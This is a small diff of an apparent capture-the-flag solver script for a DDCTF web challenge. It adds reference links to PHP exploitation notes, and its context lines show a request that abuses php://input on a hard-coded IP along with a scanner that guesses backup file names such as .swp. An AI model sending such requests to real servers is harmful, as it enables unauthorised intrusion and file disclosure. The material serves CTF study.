@@ -68,6 +68,10 @@ async function fetch (filename) {
   }
 }
 
+/**
+ * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract
+ * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3
+ */
 async function step4 () {
   const url = `http://117.51.150.246/f1ag!ddctf.php?uid=yelo&k=php://input`
   const { body } = await got.post(url, {
@@ -95,6 +99,9 @@ async function main () {
   }
 }
 
+/**
+ * https://blog.csdn.net/fengbanliuyun/article/details/80913909
+ */
 async function scan () {
   const getFilenameFunctions = [
     (n) => `${n}.swp`,
